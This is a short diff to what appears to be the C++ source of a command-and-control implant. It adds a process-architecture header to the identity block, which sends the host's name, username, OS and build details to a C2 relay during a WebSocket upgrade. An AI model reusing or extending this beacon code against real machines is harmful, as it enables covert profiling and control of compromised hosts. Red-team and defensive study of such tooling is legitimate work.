@@ -22,7 +22,7 @@ static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
 }
 
 /**
- * Builds the identity header block sent with the /agent WebSocket upgrade (API 1).
+ * Builds the identity header block sent with the root (/) WebSocket upgrade (API 1).
  *
  * @details Identity travels as HTTP headers. The relay
  * copies these headers into its agent events and /status; the C2 consumes them as
@@ -79,6 +79,7 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
     ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Agent-Process-Arch: ") != nullptr && writer.WriteString(info.ProcessArchitecture) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Platform: ") != nullptr && writer.WriteString(info.AgentPlatform) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Os-Version: ") != nullptr && writer.WriteString(info.OSVersion) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
